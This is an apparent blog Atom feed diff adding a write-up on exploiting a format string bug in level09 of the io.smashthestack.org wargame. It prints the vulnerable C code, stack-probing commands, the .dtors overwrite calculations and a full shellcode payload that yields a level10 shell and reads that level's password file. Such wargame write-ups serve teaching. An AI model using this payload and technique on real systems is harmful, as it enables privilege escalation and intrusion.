@@ -4,13 +4,182 @@
  <title>Álvaro Felipe Melchor</title>
  <link href="http://alvarofe.github.io/atom.xml" rel="self"/>
  <link href="http://alvarofe.github.io/"/>
- <updated>2015-02-27T11:12:07+01:00</updated>
+ <updated>2015-03-12T17:15:31+01:00</updated>
  <id>http://alvarofe.github.io</id>
  <author>
    <name>Álvaro Felipe Melchor</name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>Format Strings - Level09 smashTheStack</title>
+   <link href="http://alvarofe.github.io/posts/level09iosmash"/>
+   <updated>2015-03-12T00:00:00+01:00</updated>
+   <id>http://alvarofe.github.io/posts/level09iosmash</id>
+   <content type="html">&lt;p&gt;The topic for this entry is about format string vulnerability. The vulnerability appears when we use functions as &lt;code&gt;printf&lt;/code&gt; and so on wrongly.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//Good&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// wrong - What would happen if buf is &amp;quot;%x%x%x&amp;quot;?&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;When we call the latest printf call we are going to read from the stack. The layout would be the following&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;     Top of the Stack
+-------------------------
+|       Address of buf  |
+-------------------------
+|       Value of %x     |
+-------------------------
+|       Value of %x     |
+-------------------------
+|       Value of %x     |
+-------------------------
+|        ....           |
+-------------------------
+  Bottom of the Stack
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The fun of this is that you can read, write on whatever direction you want. I am not going to write about how to do it since other have written before about &lt;a href=&quot;http://inst.eecs.berkeley.edu/%7Ecs161/sp08/Notes/formatstring-1.2.pdf&quot;&gt;this&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The code to exploit is the level09 from &lt;a href=&quot;http://io.smashthestack.org&quot;&gt;io.smashthestack.org&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xbabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strncpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;level9@io:/levels$ ./level09 AAAA%x%x%x%x
+AAAAbffffe343ff160d7c41414141
+level9@io:/levels$ ./level09 AAAA4%4\$x
+AAAA441414141
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The idea is instead of &lt;code&gt;AAAA&lt;/code&gt; that does nothing, write an interesting direction using &lt;code&gt;%n&lt;/code&gt; to alter the normal execution of our program. There are different paths to follow to exploit this little code but I am going to use &lt;code&gt;.dtors&lt;/code&gt; section. For those that don&amp;#39;t know about &lt;code&gt;.dtors&lt;/code&gt; is a section that all binaries on linux compiled with &lt;code&gt;gcc&lt;/code&gt; have it. This section has an array of functions that will be called when main function exits.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;level9@io:/levels$ nm level09
+....
+080494d4 d __DTOR_END__
+080494d0 d __DTOR_LIST__
+080484c4 r __FRAME_END__
+....
+
+level9@io:/levels$ objdump -h level09
+
+level09:     file format elf32-i386
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+...
+
+ 13 .rodata       00000008  080484bc  080484bc  000004bc  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 14 .eh_frame     00000004  080484c4  080484c4  000004c4  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 15 .ctors        00000008  080494c8  080494c8  000004c8  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 16 .dtors        00000008  080494d0  080494d0  000004d0  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+....
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We can see that the section .dtors starts in &lt;code&gt;0x080494d0&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; level9@io:/levels$ objdump -s -j .dtors level09
+
+level09:     file format elf32-i386
+
+Contents of section .dtors:
+ 80494d0 ffffffff 00000000                    ........
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;How we have said before the &lt;code&gt;.dtors&lt;/code&gt; section is an array of functions. This array always starts with &lt;code&gt;0xffffffff&lt;/code&gt; and ends with the NULL address &lt;code&gt;0x00000000&lt;/code&gt;. It&amp;#39;s easy to deduce that level09 does not have any destructor. But that is not a reason to give up since this section is writable we are going to be able to write our own destructor :).&lt;/p&gt;
+
+&lt;p&gt;The idea is write in &lt;code&gt;.dtors&lt;/code&gt; with the goal of redirect the flow of the execution to the code that we will write in argv[1]. The first task that we must accomplish is to know the address of argv[1].&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;level9@io:/levels&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 250&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; i &amp;lt; 330&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; i++&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -n &lt;span class=&quot;s2&quot;&gt;&amp;quot;$i: &amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./level09 &lt;span class=&quot;s2&quot;&gt;&amp;quot;%$i\$s&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -n &lt;span class=&quot;s1&quot;&gt;$&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+
+294: �É�
+295: ,�
+296: Segmentation fault
+297: 1�^����PTRh
+298: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+299: ������������U���&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Е
+300: U���&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+301: Segmentation fault
+302: 8���B���
+303: U��WVS�O
+304: U��&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;Ít&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;
+305: U��WV1�S辊
+306:���
+307:
+308: Segmentation fault
+309: ./level09
+310: %310&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;
+311: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+312: &lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm-256color
+313: &lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/bash
+314: &lt;span class=&quot;nv&quot;&gt;SSH_CLIENT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;88.22.21.50 &lt;span class=&quot;m&quot;&gt;50860&lt;/span&gt; 22
+315: &lt;span class=&quot;nv&quot;&gt;OLDPWD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp
+316: &lt;span class=&quot;nv&quot;&gt;SSH_TTY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/pts/5
+317: &lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;level9
+318: &lt;span class=&quot;nv&quot;&gt;MAIL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/mail/level9
+319: &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+320: &lt;span class=&quot;nv&quot;&gt;PWD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/levels
+321: &lt;span class=&quot;nv&quot;&gt;LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_GB.UTF-8
+322: &lt;span class=&quot;nv&quot;&gt;SHLVL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+323: &lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/level9
+324: &lt;span class=&quot;nv&quot;&gt;LANGUAGE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_GB:en
+325: &lt;span class=&quot;nv&quot;&gt;LOGNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;level9
+326: &lt;span class=&quot;nv&quot;&gt;SSH_CONNECTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;88.22.21.50 &lt;span class=&quot;m&quot;&gt;50860&lt;/span&gt; 10.16.0.102 22
+327: &lt;span class=&quot;nv&quot;&gt;LC_CTYPE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;es_ES.UTF-8
+328: &lt;span class=&quot;nv&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;./level09
+329: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;null&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+level9@io:/levels&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./level09 %310&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;x
+bffffe42
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Basically we have walked through the stack to read everything from it to extract where resides argv[1]. Using direct parameter access we know that argv[1] is in 310th position and around &lt;code&gt;0xbffffe42&lt;/code&gt;.
+The latest direction will vary regarding how many data we write. As much data we write in argv[1] the lower the address will be.&lt;/p&gt;
+
+&lt;p&gt;Using the short write we are able to write two bytes so we are going to need two directions to write in it followed by the payload.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code&gt;\xd6\x94\x04\x08&lt;/code&gt; is to write &lt;code&gt;bfff&lt;/code&gt; and in &lt;code&gt;\xd4\x94\x04\x08&lt;/code&gt; to write the lower bytes of argv[1]&amp;#39;s address. We should know how much characters we need before to use &lt;code&gt;%n&lt;/code&gt; to write the desire number. The payload has a length of &lt;code&gt;0x38&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;level9@io:/levels$ gdb -q
+(gdb) p 0xbfff - 0x38
+$1 = 49095
+(gdb) p 0xfe42 - 0xbfff
+$2 = 15939
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We are going to need 49095 more characters before to use &lt;code&gt;%n&lt;/code&gt; to write &lt;code&gt;0xbfff&lt;/code&gt; in &lt;code&gt;0x080494d6&lt;/code&gt; and about 15939 to write &lt;code&gt;fe42&lt;/code&gt; in &lt;code&gt;0x080494d4&lt;/code&gt; although that will not be the exact value we will need to write. All this can be accomplished using the width specifier.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;./level09 $(printf &amp;quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&amp;quot;)%49095x%4\$hn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This would be the first part of our payload. The problem is that we don&amp;#39;t know where argv[1] is in the memory since the array has grown. But we can deduce it using format string.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;./level09 $(printf &amp;quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&amp;quot;)%49095x%4\$hx%15939x%310\$hx
+
+.....
+3fffdf6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;It&amp;#39;s means that in &lt;code&gt;0xbffffdf6&lt;/code&gt; is our argv[1].&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;level9@io:/levels$ gdb -q
+(gdb) p 0xfdf6 - 0xbfff
+$1 = 15863
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The problem is that if we write &lt;code&gt;fdf6&lt;/code&gt; the flow of the program will go at the beginning of argv[1] but the initial part are the directions of &lt;code&gt;.dtors&lt;/code&gt;. The direction to write would be around &lt;code&gt;0xbffffdfa&lt;/code&gt; where our payload really starts and it begins with a nop slide to augment our likelihood of success.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;(gdb) p 0xfdfa - 0xbfff
+$1 = 15867
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;And there it is, we have everything to exploit the vulnerability.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;./level09 $(printf &amp;quot;\xd6\x94\x04\x08\xd4\x94\x04\x08\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&amp;quot;)%49095x%4\$hn%15867x%5\$hn
+
+sh-4.2$ whoami
+level10
+sh-4.2$ cat /home/level10/.pass
+Os**********
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you liked this post, you can
+&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level09iosmash&amp;text=Format Strings - Level09 smashTheStack&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt;
+or
+&lt;a href=&quot;https://twitter.com/alvaro_fe&quot;&gt; follow me on Twitter&lt;/a&gt;!&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Defeating qcrk5 crackme</title>
